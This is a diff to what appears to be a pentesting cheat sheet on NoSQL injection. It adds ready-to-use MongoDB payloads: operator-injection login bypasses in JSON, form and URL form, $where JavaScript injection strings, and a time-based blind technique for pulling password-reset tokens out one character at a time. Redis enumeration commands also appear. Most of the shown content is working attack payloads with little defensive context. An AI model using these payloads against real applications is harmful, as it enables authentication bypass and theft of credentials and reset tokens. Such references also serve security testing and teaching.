@@ -29,34 +29,77 @@ grep -rn "\.findOne\|\.find\|\.findById" --include="*.js" -A5 | \
   grep "req\.\(body\|query\|params\)"
 ```
 
+## DISCOVERY — INITIAL PROBES
+
+Inject these characters into any parameter to break syntax or trigger errors:
+```
+$   {   }   \   "   `   ;   %00
+```
+Any changed response (error, different status, different content) → potential injection point.
+
+## MONGODB OPERATOR REFERENCE
+
+| Operator | Description |
+|---|---|
+| `$ne` | Not equal — matches any value other than specified (`{"$ne": null}` = any non-null) |
+| `$gt` | Greater than — `{"$gt": ""}` matches any non-empty string |
+| `$regex` | Regex match — used for character-by-character blind extraction |
+| `$where` | JavaScript expression — full JS execution on MongoDB server |
+| `$exists` | Field exists — `{"$exists": true}` matches docs that have the field |
+| `$eq` | Equal — standard equality match |
+
 ## PAYLOADS — MONGODB
 
 ### Auth bypass via operator injection
 ```bash
 # If login query is: db.users.findOne({username: INPUT, password: INPUT})
-# Inject:
-POST /login
+# JSON body:
 {"username": {"$gt": ""}, "password": {"$gt": ""}}
-# $gt:"" means "greater than empty string" = matches any non-empty value
-# Result: returns first user in DB (usually admin)
+# $gt:"" = "greater than empty string" = matches any non-empty value → returns first user (usually admin)
 
-# Or via URL parameter:
+# $ne bypass:
+{"username": "admin", "password": {"$ne": null}}
+
+# URL-encoded form body — bracket notation carries operators:
+POST /login
+Content-Type: application/x-www-form-urlencoded
+username=admin&password[$ne]=null
+
+# URL query parameter:
 GET /login?username[$gt]=&password[$gt]=
 
 # Array injection:
 {"username": "admin", "password": ["wrongpass", "admin"]}
 ```
 
-### $where JavaScript injection (MongoDB < 4.4)
+### $where JavaScript injection (MongoDB — string concatenation into $where)
 ```javascript
-// If query uses $where:
-// db.collection.find({$where: "this.username == '" + userInput + "'"})
+// If query uses: db.collection.find({$where: "this.email == " + email + " && this.token == " + token})
+// Inject into email (URL-encoded form):
+email=user@example.com'+||+TRUE;//&token=
+// Result: this.email == 'user@example.com' || TRUE; // && this.token ==
+// The comment (//) neutralizes the rest → matches all documents
 
-// Inject:
-' || '1'=='1   → always true
-'; sleep(5000); var a='  → time-based blind
-'; return true; var a='  → auth bypass
+// Classic $where string escape patterns:
+' || '1'=='1        → always true
+'; return true; var a='   → auth bypass
+'; sleep(5000); var a='   → time-based blind
+
+// JSON body $where operator injection:
+{"email": "admin@example.com", "token": {"$where": "sleep(5000)"}}
 ```
+
+### $where time-based blind data extraction
+```json
+{
+  "email": "admin@example.com",
+  "token": {
+    "$where": "if(this.resetToken.startsWith('a')) { sleep(5000); return true; } else { return true; }"
+  }
+}
+```
+If response takes ~5s → first char of `resetToken` is `'a'`. Iterate through the charset
+character by character to enumerate the full field value (reset tokens, passwords, etc.).
 
 ### $regex for data extraction (blind injection)
 ```bash
@@ -94,6 +137,15 @@ EOF
 redis-cli -h target.com -p 6379 KEYS "*"
 redis-cli -h target.com -p 6379 CONFIG GET "*"
 ```
+
+## SECOND-ORDER NOSQL INJECTION
+
+Input is stored without immediate execution (e.g., in a queue or a profile field),
+then later retrieved and embedded unsanitized into a NoSQL query by a background job.
+
+Detection: trace all stored user-controllable data through to its later query usage.
+Use OOB callbacks (OAST) rather than direct response observation — execution is delayed.
+Test import features, job queues, async notification handlers, and scheduled tasks.
 
 ## TOOLS
 
